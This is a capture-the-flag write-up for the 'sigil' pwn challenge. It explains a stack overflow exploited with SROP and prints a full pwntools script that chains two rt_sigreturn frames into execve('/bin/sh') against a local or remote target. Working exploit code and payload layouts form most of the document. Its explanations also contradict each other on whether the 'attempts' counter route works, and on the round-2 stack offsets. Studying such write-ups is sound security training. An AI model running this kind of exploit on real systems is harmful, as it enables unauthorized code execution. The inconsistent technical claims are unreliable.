# sigil — SROP without libc

**Category:** pwn
**Binary:** `sigil` (x86-64, static, no PIE, `-nostdlib`, no stack protector)
**Protections:** NX on, everything else off

## TL;DR

A tiny static binary with a stack overflow and no libc. The trick is `rt_sigreturn` (SROP): `read()` returns the number of bytes you send, so if you make the *next* `ret` land on a bare `syscall` instruction with `rax = 15`, the kernel interprets it as `rt_sigreturn` and pops a 248-byte `sigframe` from your stack. From there you get full register control and can pivot to `read()` → second `rt_sigreturn` → `execve("/bin/sh", ...)`.

---

## 1. Recon

Source (`sigil.c`) is provided. Key points:

```c
static long attempts;
#define SYS_read 0
#define SYS_write 1
#define SYS_alarm 37
#define SYS_exit 60

static long sys3(long nr, long a, long b, long c) {
    long ret;
    __asm__ volatile ("syscall"
                      : "=a"(ret)
                      : "a"(nr), "D"(a), "S"(b), "d"(c)
                      : "rcx", "r11", "memory");
    return ret;
}

static void listen(void) {
    char buf[0x40];
    attempts++;
    say("speak the sigil: ");
    sys3(SYS_read, 0, (long)buf, 0x400);   // <-- 0x400 into a 0x40 buffer
}
```

- `buf` is `0x40` bytes; `read` reads `0x400`. Classic stack overflow.
- Binary is static, no PIE, `-nostdlib`. So there is no libc, no `system`, no `/bin/sh` pointer to reuse, no dynamic symbols. Everything must be raw syscalls.
- The only "easy" code is `listen` (calls `read` in a loop) and `sys3` (a controlled syscall gadget).
- A global counter `attempts` sits at `0x404000`.

Disassembly of `sys3`:

```
0x401014: mov rax, [rbp-0x18]
0x401018: mov rdi, [rbp-0x20]
0x40101c: mov rsi, [rbp-0x28]
0x401020: mov rdx, [rbp-0x30]
0x401024: syscall
0x401026: mov [rbp-0x8], rax
0x40102a: mov rax, [rbp-0x8]
0x40102e: leave
0x40102f: ret
```

Two gadgets:

| Address | Bytes | Effect |
|---|---|---|
| `0x401014` (`sys3+0x14`) | `48 8b 45 e8 48 8b 7d e0 48 8b 75 d8 48 8b 55 d0 0f 05` | Load `rax,rdi,rsi,rdx` from `[rbp-0x18..0x30]` then `syscall` |
| `0x401024` (`sys3+0x24`) | `0f 05` | Bare `syscall` |

The first gadget is the "call any syscall with args from the stack" primitive. The second is our `rt_sigreturn` trigger.

Other useful addresses:

- `listen` = `0x401030`
- `.bss` = `0x404000`
- saved RIP offset from `buf` in `listen`: `0x40 + 8 = 0x48`

---

## 2. The SROP idea

Linux's `rt_sigreturn` (syscall 15) is special: on entry, the kernel reads a `struct sigframe` from the userspace stack, restores **all** general-purpose registers, `rip`, `rsp`, `cs`, `ss`, `eflags`, etc., then `iretq`s back to userspace at the restored `rip`. This is SROP: if you can execute `syscall` with `rax = 15`, you get total register control.

The problem: we need `rax = 15` at the moment we hit `syscall`, and there's no libc gadget like `pop rax; ret`. Two ways:

1. Control the return value of a prior `read()`.
2. Load `rax` from memory via the `sys3+0x14` gadget.

Both are usable, but option (1) is cleaner and avoids the extra stack dependencies. When `read(fd, buf, n)` returns, `rax` holds the number of bytes actually read. If we send exactly 15 bytes on the read that immediately precedes our `syscall` landing, `rax = 15` for free.

The plan:

```
round 1  ->  overflow  ->  return to listen          (re-enter read)
             plant [buf+0x50] = syscall_gadget      (round 2's saved rip)
             plant [buf+0x58] = frame1              (what rt_sigreturn will read)
round 2  ->  send 15 bytes  ->  read returns 15  ->  leave;ret lands on syscall_gadget
         ->  rt_sigreturn pops frame1               (full register control)
frame1   ->  read(0, 0x404000, 0x400)               (stage2 lands in .bss)
         ->  leave;ret pulls [0x404008]=rbp, [0x404010]=rip from stage2
         ->  rip = sigreturn_gadget                 (loads rax from [rbp-0x18])
         ->  rax = [0x404170] = 15  ->  rt_sigreturn (frame2)
frame2   ->  execve("/bin/sh", argv, envp)
```

So we do two SROPs. Between them we abuse `sys3+0x14` to turn "read 15 bytes from a known .bss address" into a second `rax = 15`.

---

## 3. `struct sigcontext` gotchas

The kernel's `rt_sigreturn` handler validates a few fields of the `sigframe` before restoring:

- `uc_flags` must satisfy `uc_flags & ~UC_FP_XSTATE == 0`. `UC_FP_XSTATE = 1`, so `uc_flags ∈ {0, 1}`. **Anything else → `-EINVAL` → no restore → SIGSEGV at the next `ret`.**
- `csgsfs` must hold valid `cs`/`ss` for `iretq`. pwntools calls this field `csgsfs` (one qword packing `cs:u16, gs:u16, fs:u16, ss:u16`). `0x33` for `cs`, `0x2b` for `ss`. **`ss = 0` will fault inside `iretq`.**
- `eflags` should typically be `0x202` (interrupts enabled).

So every frame must be built like:

```python
f = SigreturnFrame()
f.csgsfs = 0x33 | (0x2b << 48)   # cs=0x33, ss=0x2b
f.eflags = 0x202
```

and we must keep `uc_flags = 0` (default).

**Critical consequence:** we cannot smuggle the "15" for the second `rt_sigreturn` via `uc_flags` — the kernel rejects `uc_flags = 15`. The fake-15 has to live somewhere **outside** frame2, read via `[rbp-0x18]`.

---

## 4. Exploit

Everything lives in the single `.bss` page `0x404000..0x405000`. No libc, no leak, no ASLR to bypass.

```
0x404000  scratch        (SROP-driven read destination, 0x400 bytes)
0x404008  new_rbp        (rbp for the second sigreturn_gadget)
0x404010  sigreturn_gadget  (ret target after the SROP read)
0x404018  frame2         (0xf8 bytes)
0x404140  argv           -> { 0x404200, NULL }
0x404150  envp           -> { NULL }
0x404170  fake_15        (rax source for the second rt_sigreturn)
0x404200  "/bin/sh\0"
```

### Stage 1: Round 1 payload

```
[0x00..0x40)  A*0x40                    (buf)
[0x40..0x48)  p64(0x404300)             (round 1 saved rbp, any mapped .bss)
[0x48..0x50)  p64(listen)               (round 1 saved rip -> round 2)
[0x50..0x58)  p64(syscall_gadget)       (round 2 saved rip -> 0f 05)
[0x58..    )  bytes(frame1)             (what rt_sigreturn will pop)
```

`frame1`:

```python
frame1 = make_frame(
    rax=0, rdi=0, rsi=0x404000, rdx=0x400,   # read(0, 0x404000, 0x400)
    rip=syscall_gadget,                       # execute the raw syscall
    rbp=0x404008, rsp=0x404008,               # rsp -> stage2's rbp/rip
)
```

### Stage 2: Round 2 payload (exactly 15 bytes)

Send `b"A" * 15`. `read` returns 15. `leave; ret` in `listen` pops `rbp = [0x50]`, `rip = [0x58] = syscall_gadget` → `0f 05` with `rax = 15` → `rt_sigreturn` → `frame1` is loaded.

`frame1` executes `read(0, 0x404000, 0x400)` (SROP-driven). We feed it stage2.

After the SROP read returns, `sys3+0x14`'s epilogue runs:

```
mov [rbp-8], rax    ; harmless, writes 0x400 to 0x404000
mov rax, [rbp-8]    ; rax = 0x400
leave               ; rbp = [0x404008] = 0x404188 ; rsp = 0x404010
ret                 ; rip = [0x404010] = sigreturn_gadget
```

Now `sigreturn_gadget` (with `rbp = 0x404188`):

```
mov rax, [rbp-0x18] = [0x404170] = 15
mov rdi, [rbp-0x20] = garbage  (ignored by rt_sigreturn)
mov rsi, [rbp-0x28] = garbage
mov rdx, [rbp-0x30] = garbage
syscall             ; rax = 15 -> rt_sigreturn
```

`rt_sigreturn` reads frame2 from `rsp = 0x404018`. `uc_flags` is 0 (default) — accepted. `csgsfs` is set. Executes:

```python
frame2 = make_frame(
    rax=59, rdi=0x404200, rsi=0x404140, rdx=0x404150,   # execve("/bin/sh", argv, envp)
    rip=syscall_gadget,
    rbp=0x404400, rsp=0x404400,
)
```

### Stage 2 construction

```python
stage2 = bytearray(0x208)
stage2[0x08:0x10] = p64(0x404188)                    # new rbp for sigreturn_gadget
stage2[0x10:0x18] = p64(sigreturn_gadget)            # ret target
stage2[0x18:0x18+len(bytes(frame2))] = bytes(frame2) # frame2 at 0x404018
stage2[0x140:0x148] = p64(0x404200)                  # argv[0] = "/bin/sh"
stage2[0x148:0x150] = p64(0)                         # argv[1] = NULL
stage2[0x150:0x158] = p64(0)                         # envp[0] = NULL
stage2[0x170:0x178] = p64(15)                        # fake counter for rax
stage2[0x200:0x208] = b"/bin/sh\x00"
```

### Why `argv`/`envp` must be real

`execve(path, NULL, NULL)` is `-EFAULT` on modern kernels, and even where it's accepted, `/bin/sh` will segfault on `argv[0]`. So we hand it `{path, NULL}` and `{NULL}`.

---

## 5. Full exploit

```python
#!/usr/bin/env python3
from pwn import *
import time, sys

context.binary = elf = ELF("./sigil")
context.arch = "amd64"
context.log_level = "info"

sys3   = elf.sym["sys3"]
listen = elf.sym["listen"]

syscall_gadget   = sys3 + 0x24   # 0x401024  (0f 05)
sigreturn_gadget = sys3 + 0x14   # 0x401014  (mov rax,[rbp-0x18]; ...; syscall)

# .bss layout (no PIE -> fixed)
scratch   = 0x404000
new_rbp   = 0x404188
fake_cnt  = 0x404170
argv_addr = 0x404140
envp_addr = 0x404150
binsh     = 0x404200

def make_frame(**kw):
    f = SigreturnFrame()
    f.csgsfs = 0x33 | (0x2b << 48)   # cs=0x33, ss=0x2b; gs=fs=0
    f.eflags = 0x202
    for k, v in kw.items():
        setattr(f, k, v)
    return f

def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process("./sigil")

def alive(io):
    if isinstance(io, remote):
        try:
            io.can_recv(timeout=0.3); return True
        except EOFError:
            return False
    return io.poll() is None

def attempt():
    io = start()
    try:
        # ---------- Round 1: overflow, re-enter listen, plant round-2 rip + frame1
        frame1 = make_frame(
            rax=0, rdi=0, rsi=scratch, rdx=0x400,   # read(0, scratch, 0x400)
            rip=syscall_gadget,
            rbp=0x404008, rsp=0x404008,
        )
        payload1  = b"A" * 0x40
        payload1 += p64(0x404300)         # round 1 saved rbp
        payload1 += p64(listen)           # round 1 saved rip -> round 2
        payload1 += p64(syscall_gadget)   # round 2 saved rip
        payload1 += bytes(frame1)

        io.recvuntil(b"speak the sigil: ")
        io.send(payload1)

        # ---------- Round 2: exactly 15 bytes -> rax = 15 -> rt_sigreturn
        io.recvuntil(b"speak the sigil: ")
        io.send(b"A" * 15)
        time.sleep(0.5)                    # let remote's read() return 15

        if not alive(io):
            io.close(); return None

        # ---------- Stage2 (delivered by SROP-driven read)
        frame2 = make_frame(
            rax=59, rdi=binsh, rsi=argv_addr, rdx=envp_addr,
            rip=syscall_gadget, rbp=0x404400, rsp=0x404400,
        )
        stage2 = bytearray(0x208)
        stage2[0x08:0x10] = p64(new_rbp)
        stage2[0x10:0x18] = p64(sigreturn_gadget)
        stage2[0x18:0x18+len(bytes(frame2))] = bytes(frame2)
        stage2[0x140:0x148] = p64(binsh)
        stage2[0x148:0x150] = p64(0)
        stage2[0x150:0x158] = p64(0)
        stage2[0x170:0x178] = p64(15)
        stage2[0x200:0x208] = b"/bin/sh\x00"

        io.send(bytes(stage2))
        return io
    except EOFError:
        io.close(); return None

for i in range(6):
    io = attempt()
    if io:
        io.interactive()
        break
    log.warning(f"retry {i+1}")
```

Run:

```bash
python3 sigil.py                                         # local
python3 sigil.py REMOTE HOST=w04.ctf.chronos-security.ro PORT=33482
```

---

## 6. Things that went wrong / lessons

A log of every trap hit during development, in order:

1. **Gadget offsets were off by 4.** `sys3` is a small inline function; the prologue length depends on `-O0` + the compiler's frame layout. Always disassemble and read off the exact address of `mov rax, [rbp-0x18]`, not "wherever sys3 starts". Here `sys3 = 0x401000`, so `sigreturn_gadget = 0x401014` and `syscall_gadget = 0x401024`.

2. **`cs`/`ss` fields are `csgsfs` in pwntools.** Setting `f.cs = 0x33` raises `PwnlibException: Unknown register 'cs'`. The kernel's `sigcontext` has a single 8-byte `csgsfs` field packing `cs`, `gs`, `fs`, `ss`. `f.csgsfs = 0x33 | (0x2b << 48)`.

3. **`ss = 0` faults inside `iretq`.** Leaving `csgsfs` at 0 and only setting `cs` doesn't help; the `iretq` at the end of `rt_sigreturn` will fault on the null selector before your `rip` gets a chance to run.

4. **`uc_flags` must be 0 or 1.** First attempt to plant the second `rt_sigreturn`'s "15" in `frame2.uc_flags` caused `-EINVAL` → no restore → SIGSEGV. The fake-15 has to live outside frame2 (`0x404170`), read via `[rbp-0x18]`.

5. **`attempts` is a red herring.** The original plan was to call `listen` 15 times so `attempts == 15`, then trigger `sys3+0x14` with `rbp` pointing at `&attempts + 0x18`. Two problems: `.bss` might not be written by the time `attempts` is read, and it requires reading `0x403xxx` (`[&attempts + 0x18 - 0x20..-0x30]`), which may not be mapped. Fixed by getting `rax = 15` from `read` returning 15 — no `attempts` dependency at all.

6. **`execve("/bin/sh", NULL, NULL)` crashes.** Modern kernels return `-EFAULT`, and `/bin/sh` needs a valid `argv[0]`. `argv = { path, NULL }`, `envp = { NULL }`.

7. **Remote's TCP can coalesce the 15-byte send with stage2.** The 15-byte read returns *as soon as any byte arrives*, not when `0x400` bytes are buffered. If stage2 lands in the same window, `rax = 15 + len(stage2)`. Sleep `0.3–1.0s` before sending stage2, and wrap in retry loop.

8. **`remote` has no `poll()`.** Liveness check must use `can_recv(timeout=...)` + `try/except EOFError`. Or gate on `isinstance(io, remote)`.

---

## 7. Why this challenge is nice

- **No libc.** Forces you to think in raw syscalls. No `pop rdi; ret`, no `system`.
- **No `syscall; ret` via libc.** Forces you to build the syscall primitive from the binary's own `sys3` prologue.
- **`attempts` is a trap.** It looks like the intended "15" source, and it *can* work, but it pulls in extra stack dependencies that bite on unmapped pages. The `read`-returns-15 trick is cleaner and more robust.
- **`uc_flags` is a trap.** The most natural place to put "15" for the second `rt_sigreturn` is `frame2.uc_flags`, and that's exactly what the kernel refuses.
- **No leak, no ASLR, no PIE.** The whole exploit is expressible in fixed addresses; the only nondeterminism is TCP timing on remote.

Reading `sigil.c`, the author clearly intended: `attempts` goes up by one per `listen`, you push it to 15, and then the `sys3+0x14` gadget loads `rax = attempts = 15` → `rt_sigreturn`. It works, but requires the `.bss` page around `attempts` to be mapped. On the provided binary it *isn't* — `attempts` is at `0x404000`, and `[0x403fd8..0x403fe8]` (the loads for `rdx`/`rsi`/`rdi`) may fault. The `read`-returns-15 route sidesteps the whole thing.

---

## 8. Mitigation notes

Any one of these would kill the exploit:

- **PIE on.** No fixed `.bss` page for stage2, no fixed `frame1` destination, no fixed gadget addresses.
- **Full RELRO + `-fstack-protector`.** Trivial stack canary kills the overflow.
- **`read(0, buf, sizeof(buf))`.** No overflow.
- **No `syscall` in reachable code.** No `rt_sigreturn` trigger.
- **`rt_sigreturn` from a non-signal context on modern kernels?** Still allowed; the kernel doesn't check that `rt_sigreturn` was reached via a signal. This is the whole point of SROP.

Modern kernels *do* check `uc_flags`, which is why smuggling the "15" through `uc_flags` fails on remote — but the `.bss`-counter route is unaffected. SROP is alive and well.